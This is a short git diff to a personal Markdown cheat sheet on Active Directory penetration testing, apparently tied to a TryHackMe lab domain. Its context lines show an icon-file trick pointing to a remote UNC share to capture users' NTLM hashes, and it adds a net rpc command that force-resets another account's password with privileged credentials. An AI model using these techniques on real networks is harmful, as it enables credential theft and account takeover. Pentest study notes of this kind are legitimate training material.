@@ -1,4 +1,4 @@
-#  Window Active Directory Pentesting
+ #  Window Active Directory Pentesting
  # Crackmapexec
 ## With Password
 ```bash
@@ -130,4 +130,10 @@ URL=whatever
 WorkingDirectory=whatever
 IconFile=\\10.6.61.45\%USERNAME%.icon
 IconIndex=1
+```
+
+# Force_Change_Password 
+```
+net rpc password "$username_of_forced" "$desired_password" -u "thm.corp"/"$privileged_username"%"$password" -S "$IP"           
+
 ```
